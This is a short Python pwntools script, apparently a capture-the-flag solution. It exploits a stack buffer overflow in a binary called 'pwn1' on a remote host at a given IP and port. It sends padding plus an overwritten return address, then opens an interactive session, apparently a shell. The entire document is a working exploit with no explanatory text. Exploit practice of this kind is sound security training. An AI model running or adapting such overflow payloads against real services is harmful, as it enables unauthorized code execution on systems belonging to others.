from pwn import *

#p = process("./pwn1")
p = remote("81.70.239.63","28108")

offset = 0x28 + 0x4
payload = 'a'*offset + p32(0x080484f6)

p.recvuntil('Please leave your message here:\n')
p.sendline(payload)
p.interactive()
